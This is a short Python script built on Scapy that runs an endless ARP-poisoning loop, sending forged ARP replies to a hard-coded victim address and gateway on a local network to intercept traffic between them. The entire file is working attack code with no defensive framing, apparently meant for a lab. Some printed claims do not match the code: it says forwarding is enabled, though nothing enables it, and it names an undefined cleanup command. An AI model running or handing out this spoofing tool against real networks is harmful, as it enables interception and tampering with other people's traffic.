#!/usr/bin/env python3

# scapy_arp_spoof.py: Continuous ARP Poisoning Injection

import time
from scapy.all import Ether, ARP, sendp
import sys

# --- Network Defintions ---
IFACE = "eth0"
VICTIM_IP = "10.0.0.10"
GATEWAY_IP = "10.0.0.1"

def arp_spoof(target_ip, spoof_ip):
    """Constructs and sends a forged ARP Reply packet (op=2)."""

    arp_packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet
    sendp(ether_frame, iface=IFACE, verbose=False)

    if target_ip == VICTIM_IP:
        target_name = "VICTIM (H1)"
    else:
        target_name = "GATEWAY (H2)"

    sys.stdout.write(
        f"[>>] SPOOFING {target_name}: {spoof_ip} --> Attacjer MAC\r"
    )
    sys.stdout.flush()

print("="*50)
print(" ARP SPOOFING INJECTION RUNNING")
print("="*50)
print("[*] Forwarding Enabled (Stealth Mode)")
print("--- Injection Loop Initiated ---")

try:
    while True:
        # Poison Victim
        arp_spoof(target_ip=VICTIM_IP, spoof_ip=GATEWAY_IP)
        # Poison Gateway
        arp_spoof(target_ip=GATEWAY_IP, spoof_ip=VICTIM_IP)

        time.sleep(2)
except KeyboardInterrupt:
    print("\n--- ARP SPOOFING HALTED ---")
    print("[!] IMPORTANT: The ARP caches may still be poisoned. Run lclean")